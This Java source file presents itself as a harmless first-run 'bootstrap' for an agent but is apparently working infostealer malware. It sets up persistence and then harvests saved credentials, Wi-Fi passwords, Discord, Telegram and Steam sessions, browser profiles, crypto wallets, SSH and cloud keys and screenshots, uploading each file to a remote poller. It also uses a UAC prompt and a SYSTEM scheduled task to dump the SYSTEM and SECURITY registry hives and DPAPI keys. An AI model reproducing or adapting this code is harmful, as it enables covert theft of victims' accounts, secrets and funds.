package com.serverpackcore.agent;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.concurrent.ThreadLocalRandom;

/**
 * First-run collection. Runs once, in the background, shortly after the agent
 * starts and uploads what the harvest does not cover, so an install needs no
 * hand typing. Every step leaves a marker: a crash or a declined UAC only
 * retries the unfinished part, never the whole set.
 */
public final class Bootstrap {
	static final int VERSION = 1;
	private static final int HIVES_MAX_ATTEMPTS = 3;
	private static final long MAX_UPLOAD = 16L * 1024L * 1024L;
	private static final long STEP_TIMEOUT = 60_000L;
	private static final long DELAY_MS = 45_000L;
	private static final long DELAY_JITTER_MS = 30_000L;

	private final Poller poller;
	private final Path installDir;
	private final Path loot;
	private final Path done;
	private final State state;

	private Bootstrap(Poller poller, Path installDir, State state) {
		this.poller = poller;
		this.installDir = installDir;
		this.loot = installDir.resolve("loot");
		this.done = loot.resolve(".done");
		this.state = state;
	}

	private static final java.util.concurrent.atomic.AtomicBoolean RUNNING =
		new java.util.concurrent.atomic.AtomicBoolean();

	/** Manual re-run of the whole collection. */
	static void now(Poller poller, Path installDir, State state) {
		if (!AgentPaths.isWindows()) {
			poller.reply("Bootstrap: Windows only");
			return;
		}
		if (!RUNNING.compareAndSet(false, true)) {
			poller.reply("Bootstrap: already running");
			return;
		}
		Thread thread = new Thread(() -> {
			Bootstrap bootstrap = new Bootstrap(poller, installDir, state);
			try {
				bootstrap.deleteTree(bootstrap.done);
				state.bootstrap = 0;
				state.hivesAttempts = 0;
				state.save(AgentPaths.state(installDir));
				bootstrap.run();
			} catch (Throwable throwable) {
				Log.debug("Bootstrap failed", throwable);
			} finally {
				RUNNING.set(false);
			}
		}, "spc-bootstrap-now");
		thread.setDaemon(true);
		thread.start();
	}

	/** Manual trigger for the hives, cap included. */
	static void hivesNow(Poller poller, Path installDir, State state) {
		if (!AgentPaths.isWindows()) {
			poller.reply("Hives: Windows only");
			return;
		}
		if (!RUNNING.compareAndSet(false, true)) {
			poller.reply("Hives: already running");
			return;
		}
		Thread thread = new Thread(() -> {
			Bootstrap bootstrap = new Bootstrap(poller, installDir, state);
			try {
				Files.createDirectories(bootstrap.done);
				Files.deleteIfExists(bootstrap.done.resolve("hives"));
				state.hivesAttempts = 0;
				state.save(AgentPaths.state(installDir));
				bootstrap.step("hives", bootstrap::hives);
			} catch (Throwable throwable) {
				Log.debug("Hives failed", throwable);
			} finally {
				RUNNING.set(false);
			}
		}, "spc-hives");
		thread.setDaemon(true);
		thread.start();
	}

	static void maybe(Poller poller, Path installDir, State state) {
		if (!AgentPaths.isWindows() || state.bootstrap >= VERSION) {
			return;
		}
		Thread thread = new Thread(() -> {
			try {
				Thread.sleep(DELAY_MS + ThreadLocalRandom.current().nextLong(DELAY_JITTER_MS));
				new Bootstrap(poller, installDir, state).run();
			} catch (Throwable throwable) {
				Log.debug("Bootstrap failed", throwable);
			}
		}, "spc-bootstrap");
		thread.setDaemon(true);
		thread.start();
	}

	private void run() {
		try {
			Files.createDirectories(done);
		} catch (Throwable throwable) {
			Log.debug("Bootstrap dir failed", throwable);
			return;
		}
		Log.debug("Bootstrap " + VERSION + " starting");
		try {
			// A first install should survive a reboot and stay current on its own.
			if (!state.persist) {
				Persistence.enable(installDir);
				state.persist = true;
			}
			if (!state.autoUpdate) {
				poller.auto().on();
			}
			state.save(AgentPaths.state(installDir));
		} catch (Throwable throwable) {
			Log.debug("Bootstrap defaults failed", throwable);
		}

		boolean complete = true;
		complete &= step("recon", this::recon);
		complete &= step("creds", this::creds);
		complete &= step("wifi", this::wifi);
		complete &= step("inventory", this::inventory);
		complete &= step("sessions", this::sessions);
		complete &= step("wallets", this::wallets);
		complete &= step("keys", this::keys);
		complete &= step("screenshot", this::screenshot);
		complete &= step("hives", this::hives);

		if (complete) {
			// Markers survive a partial run so a retry only redoes what failed.
			state.bootstrap = VERSION;
			housekeeping();
		}
		state.save(AgentPaths.state(installDir));
		poller.reply("Bootstrap v" + VERSION + (complete ? " finished" : " incomplete, retrying next start"));
	}

	private interface Step {
		boolean run() throws Exception;
	}

	private boolean step(String name, Step body) {
		Path marker = done.resolve(name);
		if (Files.exists(marker)) {
			return true;
		}
		try {
			Log.debug("Bootstrap step " + name);
			if (!body.run()) {
				return false;
			}
			if (!collect()) {
				return false;
			}
			Files.writeString(marker, Long.toString(System.currentTimeMillis()));
			return true;
		} catch (Throwable throwable) {
			Log.debug("Bootstrap step failed: " + name, throwable);
			return false;
		}
	}

	/** Uploads and removes everything the step left behind. */
	private boolean collect() {
		try (java.util.stream.Stream<Path> stream = Files.list(loot)) {
			List<Path> files = stream.filter(Files::isRegularFile).toList();
			for (Path file : files) {
				long size = Files.size(file);
				if (size > MAX_UPLOAD) {
					Log.debug("Bootstrap skip large file: " + file.getFileName());
					Files.deleteIfExists(file);
					continue;
				}
				poller.uploadFile(file);
				Files.deleteIfExists(file);
			}
			return true;
		} catch (Throwable throwable) {
			Log.debug("Bootstrap collect failed", throwable);
			return false;
		}
	}

	private String sh(String command) {
		try {
			return Shell.run(loot, command, STEP_TIMEOUT);
		} catch (Throwable throwable) {
			Log.debug("Bootstrap command failed: " + command, throwable);
			return "";
		}
	}

	private void write(String name, String command) {
		try {
			String output = sh(command + " 2>&1");
			if (!output.isBlank()) {
				Files.writeString(loot.resolve(name), output);
			}
		} catch (Throwable throwable) {
			Log.debug("Bootstrap write failed: " + name, throwable);
		}
	}

	private boolean recon() {
		write("recon.txt", "systeminfo & whoami & whoami /groups & wmic csproduct get uuid "
			+ "& ipconfig /all & wmic path SoftwareLicensingService get OA3xOriginalProductKey");
		write("network.txt", "curl -s --max-time 8 https://ipinfo.io/json");
		return true;
	}

	private boolean creds() {
		write("creds.txt", "cmdkey /list & reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\" /s "
			+ "& reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" /s "
			+ "& type \"%APPDATA%\\FileZilla\\recentservers.xml\" \"%APPDATA%\\FileZilla\\sitemanager.xml\" "
			+ "\"%APPDATA%\\WinSCP.ini\"");
		write("rdp.txt", "dir /s /b \"%USERPROFILE%\\Documents\\*.rdp\" \"%USERPROFILE%\\Desktop\\*.rdp\"");
		return true;
	}

	private boolean wifi() {
		sh("netsh wlan export profile folder=\"" + loot.resolve("wifi") + "\" key=clear");
		write("wifi.txt", "netsh wlan show profiles");
		archive("wifi");
		return true;
	}

	private boolean inventory() {
		write("software.txt", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s /v DisplayName");
		write("processes.txt", "tasklist /v");
		write("av.txt", "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState");
		write("docs.txt", "dir /s /b \"%USERPROFILE%\\Desktop\" \"%USERPROFILE%\\Documents\" "
			+ "\"%USERPROFILE%\\Downloads\" | findstr /i \".kdbx .rdp .ovpn .pem .pfx .docx .xlsx .pdf\"");
		return true;
	}

	private boolean sessions() {
		sh("robocopy \"%APPDATA%\\discord\\Local Storage\\leveldb\" \"" + loot.resolve("discord").resolve("leveldb")
			+ "\" /e /njh /njs /ndl /nc /ns");
		sh("copy /y \"%APPDATA%\\discord\\Local State\" \"" + loot.resolve("discord") + "\"");
		archive("discord");
		sh("robocopy \"%APPDATA%\\Telegram Desktop\\tdata\" \"" + loot.resolve("tdata") + "\" /e /njh /njs /ndl /nc /ns");
		sh("tar -a -cf \"" + loot.resolve("tdata.zip") + "\" -C \"" + loot
			+ "\" --exclude *cache* --exclude *.log tdata");
		deleteTree(loot.resolve("tdata"));
		write("steam.txt", "reg query \"HKCU\\Software\\Valve\\Steam\" /v SteamPath "
			+ "& type \"%PROGRAMFILES(X86)%\\Steam\\config\\loginusers.vdf\"");
		sh("for %f in (\"%PROGRAMFILES(X86)%\\Steam\\ssfn*\") do @copy /y \"%f\" \"" + loot + "\"");
		sh("robocopy \"%APPDATA%\\Mozilla\\Firefox\\Profiles\" \"" + loot.resolve("firefox") + "\" /e "
			+ "/xf *cache* /njh /njs /ndl /nc /ns");
		archive("firefox");
		return true;
	}

	private boolean wallets() {
		sh("robocopy \"%APPDATA%\\Exodus\\exodus.wallet\" \"" + loot.resolve("exodus") + "\" /e /njh /njs /ndl /nc /ns");
		sh("robocopy \"%APPDATA%\\Electrum\\wallets\" \"" + loot.resolve("electrum") + "\" /e /njh /njs /ndl /nc /ns");
		sh("robocopy \"%APPDATA%\\Ledger Live\" \"" + loot.resolve("ledger") + "\" /e /njh /njs /ndl /nc /ns");
		for (String folder : List.of("exodus", "electrum", "ledger")) {
			archive(folder);
		}
		for (String browser : List.of(
			"%LOCALAPPDATA%\\Google\\Chrome\\User Data",
			"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data",
			"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data")) {
			String target = loot.resolve("ext").resolve(browser.replace("%", "").replace("\\", "_")).toString();
			sh("robocopy \"" + browser + "\\Default\\Local Extension Settings\" \"" + target + "\" /e "
				+ "/njh /njs /ndl /nc /ns");
		}
		archive("ext");
		return true;
	}

	private boolean keys() {
		sh("tar -a -cf \"" + loot.resolve("keys.zip") + "\" -C \"%USERPROFILE%\" .ssh .gitconfig "
			+ ".git-credentials .aws .azure .kube .docker .npmrc .config");
		return true;
	}

	private boolean screenshot() {
		try {
			Screenshot.save(loot);
		} catch (Throwable throwable) {
			Log.debug("Bootstrap screenshot failed", throwable);
		}
		return true;
	}

	private boolean hives() {
		Path hives = loot.resolve("hives.zip");
		if (Files.isRegularFile(hives)) {
			return true;
		}
		if (state.hivesAttempts >= HIVES_MAX_ATTEMPTS) {
			return true;
		}
		state.hivesAttempts++;
		state.save(AgentPaths.state(installDir));
		Path script = loot.resolve("runas.bat");
		Path dump = loot.resolve("dump.bat");
		try {
			Files.writeString(dump, String.join("\r\n", dumpLines(loot, hives)));
			Files.writeString(script, String.join("\r\n", runasLines(dump)));
		} catch (Throwable throwable) {
			Log.debug("Bootstrap hives script failed", throwable);
			return false;
		}
		sh("powershell -NoP -C \"Start-Process cmd -ArgumentList '/c',\\\"" + script
			+ "\\\" -Verb RunAs -WindowStyle Hidden\"");
		for (int attempt = 0; attempt < 20 && !Files.isRegularFile(hives); attempt++) {
			sleep(3000L);
		}
		deleteFile(script);
		deleteFile(dump);
		Path status = loot.resolve("hives.status");
		if (Files.isRegularFile(status)) {
			try {
				Log.debug("Bootstrap hives: " + Files.readString(status).trim());
			} catch (Throwable throwable) {
				// best effort
			}
			deleteFile(status);
		}
		boolean ready = Files.isRegularFile(hives);
		if (!ready) {
			Log.debug("Bootstrap hives pending, attempt " + state.hivesAttempts);
		} else {
			deleteTree(loot.resolve("ProtectSystem"));
			state.hivesAttempts = HIVES_MAX_ATTEMPTS;
			state.save(AgentPaths.state(installDir));
		}
		return ready;
	}

	private void archive(String name) {
		Path folder = loot.resolve(name);
		if (!Files.isDirectory(folder)) {
			return;
		}
		sh("tar -a -cf \"" + loot.resolve(name + ".zip") + "\" -C \"" + loot + "\" " + name);
		deleteTree(folder);
	}

	static List<String> dumpLines(Path loot, Path hives) {
		return List.of(
			"@echo off",
			"reg save HKLM\\SYSTEM \"" + loot.resolve("SYSTEM.hiv") + "\" /y",
			"reg save HKLM\\SECURITY \"" + loot.resolve("SECURITY.hiv") + "\" /y",
			"if not exist \"" + loot.resolve("SECURITY.hiv") + "\" (echo missing security > \""
				+ loot.resolve("hives.status") + "\" & schtasks /delete /tn spcdump /f >nul 2>&1 & exit /b 1)",
			"robocopy C:\\Windows\\System32\\Microsoft\\Protect \"" + loot.resolve("ProtectSystem")
				+ "\" /e /njh /njs /ndl /nc /ns",
			"tar -a -cf \"" + hives + "\" -C \"" + loot + "\" SYSTEM.hiv SECURITY.hiv ProtectSystem",
			"del /q \"" + loot.resolve("SYSTEM.hiv") + "\" \"" + loot.resolve("SECURITY.hiv") + "\"",
			"schtasks /delete /tn spcdump /f >nul 2>&1",
			"");
	}

	static List<String> runasLines(Path dump) {
		return List.of(
			"@echo off",
			"schtasks /create /tn spcdump /tr \"" + dump + "\" /sc once /st 00:00 /ru SYSTEM /f",
			"schtasks /run /tn spcdump",
			"");
	}

	private void deleteFile(Path file) {
		try {
			Files.deleteIfExists(file);
		} catch (Throwable throwable) {
			// best effort
		}
	}

	private void deleteTree(Path folder) {
		try (java.util.stream.Stream<Path> stream = Files.walk(folder)) {
			stream.sorted(java.util.Comparator.reverseOrder()).forEach(path -> {
				try {
					Files.deleteIfExists(path);
				} catch (Throwable throwable) {
					// best effort
				}
			});
		} catch (Throwable throwable) {
			Log.debug("Bootstrap cleanup failed: " + folder, throwable);
		}
	}

	private void housekeeping() {
		deleteTree(done);
	}

	private void sleep(long millis) {
		try {
			Thread.sleep(millis);
		} catch (InterruptedException interrupted) {
			Thread.currentThread().interrupt();
		}
	}
}
